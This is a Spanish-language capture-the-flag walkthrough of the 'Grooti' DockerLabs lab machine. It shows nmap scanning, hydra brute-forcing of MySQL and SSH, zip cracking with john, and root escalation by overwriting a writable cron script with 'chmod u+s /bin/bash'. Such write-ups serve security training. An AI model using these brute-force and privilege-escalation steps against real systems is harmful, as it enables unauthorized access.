---
icon: flag
---

# Grooti DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip grooti.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh grooti.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 06:57 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.000041s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 46:69:49:1a:d0:b7:26:05:90:a3:22:b2:a8:fe:fd:83 (ECDSA)
|_  256 91:67:c5:15:53:13:af:6f:28:7d:1e:77:46:0c:c1:bb (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: \xF0\x9F\x8C\xB1 Grooti's Web
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.24.04.2
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| Not valid before: 2025-07-18T22:37:08
|_Not valid after:  2035-07-16T22:37:08
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.24.04.2
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, InteractiveClient, SupportsCompression, IgnoreSigpipes, Speaks41ProtocolOld, FoundRows, SupportsTransactions, 
DontAllowDatabaseTableColumn, LongPassword, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, Support41Auth, 
ConnectWithDatabase, SwitchToSSLAfterHandshake, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: "]uG.'\\x0C;I \x08z8:3IcZ
| 
|_  Auth Plugin Name: caching_sha2_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```

Veremos en el puerto `80` que aloja una pagina web y algo mas interesante, tiene expuesto el puerto `3306` que corresponde con el de `MySQL`, por lo que vamos a enumerar estos dos puertos a ver que encontramos.

Si inspeccionamos la pagina del puerto `80` veremos la siguiente linea comentada:

```html
<!-- 
        I am Grooti...
        Creo que Rocket ha entrado a mi base de datos...
	
	
    -->
```

Vemos que nos esta proporcionando un nombre de usuario para `MySQL` llamado `Rocket` por lo que vamos a probar a lanzar una `fuerza bruta` a `MySQL` con `hydra` de esta forma:

## Hydra

```shell
hydra -l rocket -P <WORDLIST> mysql://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-28 07:01:14
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: rocket   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 07:01:16
```

Veremos que ha funcionado, por lo que vamos a conectarnos a la `DDBB` con dichas credenciales.

## MySQL

```shell
mysql -h <IP_ATTACKER> -u rocket -ppassword1 --ssl=0 
```

Info:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 80
Server version: 8.0.42-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Una vez que estemos dentro, vamos a realizar una enumeracion a ver que encontramos.

```mysql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| files_secret       |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.003 sec)
```

Veremos que hay una `DDBB` bastante interesante llamada `files_secret` si vemos que tablas tiene por dentro veremos lo siguiente:

```mysql
use files_secret;
show tables;
```

Info:

```
+------------------------+
| Tables_in_files_secret |
+------------------------+
| rutas                  |
+------------------------+
1 row in set (0.002 sec)
```

Vamos a listar toda la informacion de dicha tabla...

```mysql
select * from rutas;
```

Info:

```
+----+------------+---------------------------------+
| id | nombre     | ruta                            |
+----+------------+---------------------------------+
|  1 | imagenes   | /var/www/html/files/imagenes/   |
|  2 | documentos | /var/www/html/files/documentos/ |
|  3 | facturas   | /var/www/html/files/facturas/   |
|  4 | secret     | /unprivate/secret               |
+----+------------+---------------------------------+
4 rows in set (0.001 sec)
```

Por lo que vemos parecen rutas a nivel de recursos web de la pagina, vamos a probar a ver cuales son las mas interesantes.

Si entramos a `/unprivate/secret` veremos como un acceso a la terminal pero con un formulario web que nos indica instrucciones de que debemos de hacer, vamos a investigar a ver que podemos aprovechar en este espacio.

Si ponemos un texto y despues un numero, se nos descarga un archivo `Excel` en el que aparece una palabra aleatoria, si volvemos a descargarnoslo aparece nuestro texto y asi con los demas numeros, vamos a ver cual de los numero no descarga un archivo de `Excel` o tiene otro contenido con un script:

> findWeb.sh

```bash
#!/bin/bash

URL="http://<IP_ATTACKER>/unprivate/secret/generate.php"
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
REFERER="http://<IP_ATTACKER>/unprivate/secret/"
ORIGIN="http://<IP_ATTACKER>"

for number in $(seq 1 100); do
    echo "Requesting number=$number..."

    # Archivo temporal para guardar Excel
    temp_file=$(mktemp --suffix=.xlsx)

    # Hacer POST con curl
    curl -s -X POST "$URL" \
        -H "Host: <IP_ATTACKER>" \
        -H "User-Agent: $USER_AGENT" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.5" \
        -H "Accept-Encoding: gzip, deflate, br" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Origin: $ORIGIN" \
        -H "Connection: keep-alive" \
        -H "Referer: $REFERER" \
        -H "Upgrade-Insecure-Requests: 1" \
        --data "content=test&number=$number" \
        --output "$temp_file"

    # Convertir Excel a CSV y mostrar
    if command -v xlsx2csv &> /dev/null; then
        echo "Contenido del archivo para number=$number:"
        xlsx2csv "$temp_file"
    elif command -v ssconvert &> /dev/null; then
        echo "Contenido del archivo para number=$number:"
        ssconvert "$temp_file" /dev/stdout | cat
    else
        echo "No tienes instalado xlsx2csv ni ssconvert para leer Excel."
        echo "Archivo guardado en $temp_file"
    fi

    # Borrar archivo temporal
    rm "$temp_file"
    echo "-------------------------------------"
done
```

Lo guardamos e instalamos lo siguiente:

```shell
chmod +x findWeb.sh
pip install xlsx2csv
sudo apt install gnumeric
```

Ahora lo ejecutamos de esta forma:

```shell
./findWeb.sh
```

Info:

```
Requesting number=1...
Contenido del archivo para number=1:
Invalid xlsx file: /tmp/tmp.cMESI0vLDS.xlsx

-------------------------------------
Requesting number=2...
Contenido del archivo para number=2:
Invalid xlsx file: /tmp/tmp.11QryvhmL4.xlsx

-------------------------------------
Requesting number=3...
Contenido del archivo para number=3:
Invalid xlsx file: /tmp/tmp.nseON2Zqf6.xlsx

-------------------------------------
Requesting number=4...
Contenido del archivo para number=4:
Invalid xlsx file: /tmp/tmp.cuJoUnbJNa.xlsx

-------------------------------------
Requesting number=5...
Contenido del archivo para number=5:
Invalid xlsx file: /tmp/tmp.QwyKJGPn15.xlsx

-------------------------------------
Requesting number=6...
Contenido del archivo para number=6:
Invalid xlsx file: /tmp/tmp.QYokVJedK8.xlsx

-------------------------------------
Requesting number=7...
Contenido del archivo para number=7:
Invalid xlsx file: /tmp/tmp.LVrLhrCkiS.xlsx

-------------------------------------
Requesting number=8...
Contenido del archivo para number=8:
Invalid xlsx file: /tmp/tmp.HKxaPCjftJ.xlsx

-------------------------------------
Requesting number=9...
Contenido del archivo para number=9:
Invalid xlsx file: /tmp/tmp.aeMemYcH2M.xlsx

-------------------------------------
Requesting number=10...
Contenido del archivo para number=10:
Invalid xlsx file: /tmp/tmp.4P4syUIMyg.xlsx

-------------------------------------
Requesting number=11...
Contenido del archivo para number=11:
Invalid xlsx file: /tmp/tmp.ozKfGb84Al.xlsx

-------------------------------------
Requesting number=12...
Contenido del archivo para number=12:
Invalid xlsx file: /tmp/tmp.55PruhIJxB.xlsx

-------------------------------------
Requesting number=13...
Contenido del archivo para number=13:
Invalid xlsx file: /tmp/tmp.CAIQQOc2Tt.xlsx

-------------------------------------
Requesting number=14...
Contenido del archivo para number=14:
Invalid xlsx file: /tmp/tmp.AizGHjrN6R.xlsx

-------------------------------------
Requesting number=15...
Contenido del archivo para number=15:
Invalid xlsx file: /tmp/tmp.RDpx18wd0g.xlsx

-------------------------------------
Requesting number=16...
Contenido del archivo para number=16:
Traceback (most recent call last):
  File "/home/kali/Desktop/grooti/.venv/bin/xlsx2csv", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/kali/Desktop/grooti/.venv/lib/python3.13/site-packages/xlsx2csv.py", line 1243, in main
    xlsx2csv = Xlsx2csv(options.infile, **kwargs)
  File "/home/kali/Desktop/grooti/.venv/lib/python3.13/site-packages/xlsx2csv.py", line 228, in __init__
    workbook_relationships = list(filter(lambda r: "book" in r, self.content_types.types["relationships"]))
                                  ~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
TypeError: 'NoneType' object is not iterable
```

Vemos que en el numero `16` da un error, por lo que se puede deber a que no sea un archivo `Excel` si no que, pueda deberse a un archivo de otra cosa, vamos a comprobarlo metiendo el numero `16` y escribiendo cualquier cosa.

Si hacemos esto nos descargara un archivo `.zip`, si lo descomprimimos veremos lo siguiente:

```shell
unzip password16.zip
```

Info:

```
Archive:  password16.zip
[password16.zip] password16.txt password: 
   skipping: password16.txt          incorrect password
```

Vemos que requiere de una contraseña, por lo que vamos a probar a `crackearla` con `john` de esta forma:

```shell
zip2john password16.zip > zip.hash
```

```shell
john --wordlist=<WORDLIST> zip.hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (password16.zip/password16.txt)     
1g 0:00:00:00 DONE (2025-07-28 07:22) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que nos ha `crackeado` la `password`, vamos a probarla en el archivo a ver si funciona.

```shell
unzip password16.zip
```

Info:

```
Archive:  password16.zip
[password16.zip] password16.txt password: 
  inflating: password16.txt
```

Vemos que hemos extraido el archivo de forma correcta, vamos a ver que contiene:

## Escalate user grooti

> password16.txt

```
admin123
123456
qwerty
letmein
roottoor
12345678
password
summer2025
iloveyou
hunter2
passw0rd
toor123
changeme
adminadmin
welcome1
trustno1
abc123456
useruser
dragon2024
mydogrex
grootlove
Galaxy42
!P@ssword!
megasecret
YOLOgroot
P@ss1234
monkeybanana
YOgrootRULEZ
YoSoYgRoOt
finalchance
1qaz2wsx
batman2025
rootroot
hello123
```

Vemos que son una serie de contraseñas para algun usuario suponemos del sistema, vamos a probarla con `hydra` por `SSH` a ver si hay suerte, con `2` usuarios en este caso `grooti` y `rocket`.

> users.txt

```
grooti
rocket
```

### Hydra (grooti)

```shell
hydra -L users.txt -P password16.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-28 07:26:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 68 login tries (l:2/p:34), ~2 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: grooti   password: YoSoYgRoOt
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 07:26:50
```

Veremos que ha funcionado, por lo que vamos a conectarnos por `SSH` con dichas credenciales.

```shell
ssh grooti@<IP>
```

Metemos como contraseña `YoSoYgRoOt` y veremos que estaremos dentro.

Info:

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.12.13-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Jul 19 17:10:56 2025 from 172.17.0.1
grooti@51201a2dbfaa:~$ whoami
grooti
```

## Escalate Privileges

Si nos vamos a `/tmp` veremos un archivo `.sh` llamado `malicious.sh` que si listamos para ver los permisos que tiene veremos lo siguiente:

```
-rwxrw-r-- 1 root  grooti  221 Jul 22 21:07 malicious.sh
```

Vemos que podemos modificar dicho script, si leemos que hace el mismo...

```bash
#!/bin/bash

LOG_TEMP="/tmp/mi_log_temporal.log"

echo "Log temporal creado a $(date)" > "$LOG_TEMP"
echo "Archivo $LOG_TEMP creado."

sleep 2

rm -f "$LOG_TEMP"
echo "Archivo $LOG_TEMP eliminado después de 2 segundos."
```

Vemos que crea un archivo en la carpeta `/tmp` como si fuera un `log` y lo borra a los `2` segundos:

```
total 20
drwxrwxrwt 1 root  root   4096 Jul 28 13:34 .
drwxr-xr-x 1 root  root   4096 Jul 28 12:57 ..
-rwxrw-r-- 1 root  grooti  221 Jul 22 21:07 malicious.sh
-rw-r--r-- 1 root  root     52 Jul 28 13:34 mi_log_temporal.log
drwx------ 2 mysql mysql  4096 Jul 19 00:37 tmp.ngOCkV7Loy
```

Veremos que efectivamente hay alguna tarea programada que esta ejecutando dicho script, pero esto en si, no nos interesa, vamos a borrar todo el contenido del script y poner esto:

```bash
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y solo tendremos que esperar un rato a que se ejecute por `root`.

Ahora despues de un rato si listamos la `bash` veremos lo siguiente:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que ya se establecieron los permisos `SUID` a la `bash` por lo que podremos hacer lo siguiente para ser `root`.

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Veremos que con esto ya seremos `root`, por lo que habremos terminado la maquina y leeremos la `flag` de `root`.

> grooti.txt

```
⠰⣶⣶⣶⣄⠀⠀⠀⢀⣀⠀⠀⣠⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠻⣿⣿⣿⡀⠀⠀⣿⠿⠷⢾⡏⠉⣿⣄⢀⣿⣷⡆⠀⠀
⢀⣠⣬⡁⢸⣿⣶⣿⣿⡇⠀⣾⡇⠀⣿⡏⠛⢻⣿⢧⣤⠀
⢸⣿⡿⡿⢻⠇⠀⢿⣿⡇⣠⣿⡇⣼⡿⠀⠀⣼⡏⢠⣾⠀
⢸⣿⡀⢀⣿⠀⣴⠈⣿⣿⣿⣿⣿⣿⠃⣾⣤⣿⠀⣼⣿⠀
⢸⣿⣧⢸⣿⣧⣿⣇⣿⣿⣿⣿⣿⣿⣾⣿⣿⣏⣼⣿⣿⠀
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⢹⣿⣿⣿⣿⣿⠉⠙⣿⣿⣿⣿⣿⡯⠉⢻⣿⣿⣿⣿⠀
⠀⠸⣿⣿⣿⣧⡀⠀⣠⣿⣿⣿⣿⣄⠀⢀⣼⣿⣿⣿⠇⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣷⣄⣀⣀⣠⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠟⠛⠉⠀
```
